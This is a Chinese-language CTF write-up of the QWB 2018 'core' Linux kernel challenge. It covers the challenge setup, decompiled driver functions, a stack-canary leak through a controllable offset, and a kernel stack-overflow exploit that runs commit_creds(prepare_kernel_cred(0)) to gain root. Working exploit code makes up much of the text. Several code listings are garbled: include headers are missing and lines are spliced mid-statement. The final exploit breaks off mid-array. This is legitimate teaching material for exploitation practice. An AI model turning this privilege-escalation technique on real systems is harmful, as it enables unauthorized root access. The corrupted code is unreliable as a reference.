本篇文章主要针对内核栈溢出以及堆越界访问漏洞进行分析以及利用。
### qwb2018 core
题目链接： 密码：ldiy
解压官方给的tar包，可以看到如下4个文件：  
其中`start.sh`是qemu的启动脚本，这里将`-m`参数修改为512M，否则本地无法正常启动，同时为了便于调试，需要解包core.cpio并修改其中的init文件，将`poweroff`的指令删除，让内核不在定时关闭。`init`文件内容如下：
    #!/bin/sh
    mount -t proc proc /proc
    mount -t sysfs sysfs /sys
    mount -t devtmpfs none /dev
    /sbin/mdev -s
    mkdir -p /dev/pts
    mount -vt devpts -o gid=4,mode=620 none /dev/pts
    chmod 666 /dev/ptmx
    cat /proc/kallsyms > /tmp/kallsyms
    echo 1 > /proc/sys/kernel/kptr_restrict
    echo 1 > /proc/sys/kernel/dmesg_restrict
    ifconfig eth0 up
    udhcpc -i eth0
    ifconfig eth0 10.0.2.15 netmask 255.255.255.0
    route add default gw 10.0.2.2 
    insmod /core.ko
    setsid /bin/cttyhack setuidgid 1000 /bin/sh
    echo 'sh end!\n'
    umount /proc
    umount /sys
基本可以确认存在漏洞的模块为`core.ko`，而开启的`kptr_restrict`、`dmesg_restrict`则缓解了内核信息的泄露，卸载了`/proc`、`/sys`这两个目录，进一步阻止用户查看内核信息。查看start.sh可知内核开启了kaslr。注意到`cat
/proc/kallsyms >
/tmp/kallsyms`这条命令，相当于可以从`/tmp/kallsyms`读取部分内核符号信息，这样便于后面编写提权的shellcode。
解包core.cpio后，查看core.ko开启的防护如下：
    gdb-peda$ checksec
    CANARY    : ENABLED
    FORTIFY   : disabled
    NX        : ENABLED
    PIE       : disabled
    RELRO     : disabled
开启了`NX`以及`stack canary`，利用ghidra打开`core.ko`，查看它的函数如下：
初始化函数如下：
    undefined8 init_module(void)
    {
      core_proc = proc_create(&DAT_001002fd,0x1b6,0,core_fops);
      printk(&DAT_00100302);
      return 0;
    }
其中core_fops是内核的`file_operations`结构，跟进去查看发现其实现了自定义的`write`、`ioctl`、`release`函数，其中`ioctl`函数内部调用了`core_read`、`core_copy_func`等功能，如下：
    undefined8 core_ioctl(undefined8 param_1,int param_2,ulong param_3)
    {
      if (param_2 == 0x6677889b) {
        core_read(param_3);
      }
      else {
        if (param_2 == 0x6677889c) {
          printk(&DAT_001002f1,param_3);
          off = param_3;
        }
        else {
          if (param_2 == 0x6677889a) {
            printk(&DAT_001002d7);
            core_copy_func(param_3);
          }
        }
      }
      return 0;
    }
这里由于之前开启的内核策略导致`printfk`输出的内容无法通过`dmesg`获取，查看core_read函数如下：
    void core_read(undefined8 param_1)
    {
      long lVar1;
      undefined4 *puVar2;
      long in_GS_OFFSET;
      byte bVar3;
      undefined4 auStack80 [16];
      long local_10;
      bVar3 = 0;
      local_10 = *(long *)(in_GS_OFFSET + 0x28);
      printk(&DAT_0010027f);
      printk(&DAT_00100299,off,param_1);
      lVar1 = 0x10;
      puVar2 = auStack80;
      while (lVar1 != 0) {
        lVar1 = lVar1 + -1;
        *puVar2 = 0;
        puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
      }
      strcpy((char *)auStack80,"Welcome to the QWB CTF challenge.\n");
      lVar1 = _copy_to_user(param_1,(long)auStack80 + off,0x40);//全局变量off可控
      if (lVar1 != 0) {
        swapgs();
        return;
      }
      if (local_10 != *(long *)(in_GS_OFFSET + 0x28)) {
                        /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
由于可以通过`ioctl`控制off这个全局变量，因此可以控制返回给用户的内容为内核栈上特定偏移的数据，这里可以用来泄露栈`cookie`值，通过如下代码可以打印泄露的`cookie`以及`函数返回地址`:
    #include 
    #include 
    #include 
    #include 
    int main(int argc,char* argv[])
    {
        int fd1 = open("/proc/core",O_RDWR);
        unsigned long long buf[0x1000];
        memset(buf,'a',0x200);
        int off=0;
        if(argc>1)
        {
            off=strtol(argv[1],NULL,10);
        }
        printf("fd is %d\n",fd1);
        ioctl(fd1,0x6677889C,off);
        ioctl(fd1,0x6677889B,buf);
        for(int i =0;icookie值，可用来后续的内核rop。查看`core_write`函数:
    undefined  [16] core_write(undefined8 param_1,undefined8 param_2,ulong param_3)
    {
      ulong uVar1;
      long lVar2;
      printk(&DAT_00100239);
      if (param_3 name全局变量的内容。查看core_copy_func函数，如下：
    undefined8 core_copy_func(ulong param_1)
    {
      undefined8 uVar1;
      ulong uVar2;
      undefined1 *puVar3;
      undefined *puVar4;
      long in_GS_OFFSET;
      byte bVar5;
      undefined auStack80 [64];
      long local_10;
      bVar5 = 0;
      local_10 = *(long *)(in_GS_OFFSET + 0x28);
      printk(&DAT_00100239);
      if ((long)param_1 name全局变量的内容拷贝到栈上，造成栈溢出，接下来就需要考虑如何进行rop了。
### 方法1
首先我们需要将`rip`覆盖为我们的执行shellcode函数的地址，这样当函数`core_copy_func`返回时便会执行我们的shellcode，同时为了不破坏栈上的其它数据，我们选择大小为0x58的shellcode，这样刚好仅仅覆盖了返回地址。在我们shellcode内部则会执行`commit_creds(prepare_kernel_cred(0))`这两个函数，函数成功执行后此时已经程序已经拥有了root权限，为了让内核继续完好的执行，我们选择在这两个函数执行完毕后修复栈帧，同时跳转到本来应该返回的内核函数位置，即`core.ko+0x191`，这个返回地址通过前面的信息泄露可以拿到。完整的exp如下：
    #include 
    #include 
    #include 
    #include 
    typedef unsigned long long u64;
    u64 prepare_kernel_cred;
    u64 commit_creds;
    u64 ret_addr;
    u64 readkerneladdr(char* command)
    {
        FILE *fp; 
        u64 kaddr;
        char buffer[80];
        char* retbuf;
        fp=popen(command, "r"); 
        fgets(buffer,sizeof(buffer),fp); 
        retbuf = strstr(buffer," ");
        int addrlen = retbuf-buffer;
        memset(buffer+addrlen,0,10);
        kaddr = strtoul(buffer,NULL,16);
        return kaddr;
    }
    void poc1_shellcode()
    {   
        int*(*userPrepare_kernel_cred)(int) = prepare_kernel_cred;
        void*(*userCommit_cred)(int*) = commit_creds;
        (*userCommit_cred)((*userPrepare_kernel_cred)(0));
        asm("mov %rbp,%rsp");   //修复栈帧
        asm("pop %rbp");
        asm("mov %0,%%rax;  \   //跳转回内核函数地址
            jmp %%rax;"
            :
            :"r"(ret_addr)
            :"%rax");
    }
    int main(int argc,char* argv[])
    {
        int fd1 = open("/proc/core",O_RDWR);
        prepare_kernel_cred = readkerneladdr("cat /tmp/kallsyms|grep prepare_kernel_cred");
        commit_creds = readkerneladdr("cat /tmp/kallsyms|grep commit_creds");
        u64 buf[0x1000];
        memset(buf,'a',0x200);
        int off=64;
        if(argc>1)
        {
            off=strtol(argv[1],NULL,10);
        }
        printf("fd is %d\n",fd1);
        ioctl(fd1,0x6677889C,off);
        ioctl(fd1,0x6677889B,buf);
        u64 canary = buf[0];
        ret_addr = buf[2];
        u64 poc[0x100]={
            0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,canary,0,&poc1_shellcode
        };